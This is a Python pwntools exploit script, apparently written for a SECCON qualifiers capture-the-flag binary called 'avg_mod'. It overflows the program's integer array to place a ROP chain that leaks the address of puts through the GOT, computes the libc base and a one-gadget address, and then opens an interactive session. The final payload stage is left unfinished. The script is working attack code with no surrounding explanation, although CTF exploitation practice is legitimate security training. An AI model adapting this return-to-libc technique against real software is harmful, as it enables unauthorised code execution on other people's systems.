#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'average.quals.seccon.jp', 1234
binary = './avg_mod'
brkpts = '''
'''

elf = ELF("avg_mod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

pop_rdi = 0x4013a3

def init():
    n = 25
    sla("n: ",str(n))
    for i in range(21):
        if i == 16:
            sla(": ",str(n))
        sla(": ",str(i))

def leak():
    sla(": ", str(pop_rdi))
    sla(": ", str(elf.got["puts"]))
    sla(": ", str(elf.plt["puts"]))
    sla(": ", str(elf.symbols["main"]))
    rl()

if __name__ == "__main__":
    init()
    leak()
    libc.address = unpack(re(6),48) - libc.symbols["puts"]
    log.info("Libc -> "+hex(libc.address))

    gadget = libc.address + 0xdf54f

    io.interactive()
